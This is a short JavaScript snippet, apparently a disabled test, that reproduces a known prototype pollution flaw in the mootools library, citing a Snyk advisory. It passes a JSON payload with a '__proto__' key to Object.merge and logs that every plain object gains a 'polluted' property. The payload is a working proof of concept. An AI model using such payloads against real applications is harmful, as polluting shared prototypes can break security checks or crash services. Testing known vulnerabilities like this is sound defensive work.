// //https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
// test("prototype pollution in mootools", () => {
  require("mootools");

console.log({}.polluted);

  Object.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));

console.log({}.polluted);
// });
